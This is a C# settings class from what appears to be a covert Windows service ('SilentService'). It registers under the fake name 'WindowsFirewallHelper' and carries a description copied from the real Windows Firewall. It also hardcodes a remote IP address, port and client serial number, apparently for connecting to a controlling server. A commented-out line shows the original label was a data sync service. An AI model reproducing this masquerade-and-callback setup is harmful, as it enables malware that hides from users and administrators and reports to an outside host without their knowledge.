using Cocon90.Lib.Util.Ini;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;

namespace SilentService.Utils
{
    public class SettingHelper
    {
        //IniHelper ini = null;
        public SettingHelper()
        {
            //ini = new IniHelper(AppDomain.CurrentDomain.BaseDirectory.TrimEnd('\\') + "\\setting.cfg");
            //if (string.IsNullOrWhiteSpace(ReadServiceName()))
            //{
            //    ini.Write("Service", "Name", Assembly.GetExecutingAssembly().GetName().Name);
            //}
            //if (string.IsNullOrWhiteSpace(ReadServiceDiscription()))
            //{
            //    ini.Write("Service", "Discription", "数据同步服务！");
            //}
        }

        public string ReadServiceDiscription()
        {
            return "Windows 防火墙通过阻止未授权用户通过 Internet 或网络访问您的计算机来帮助保护计算机。";
        }

        public string ReadServiceName()
        {
            return "WindowsFirewallHelper";
        }
        public static string IPAddress = "123.56.121.148";
        public static int Port = 1991;
        public static long ClientSn = 906079880;

    }
}
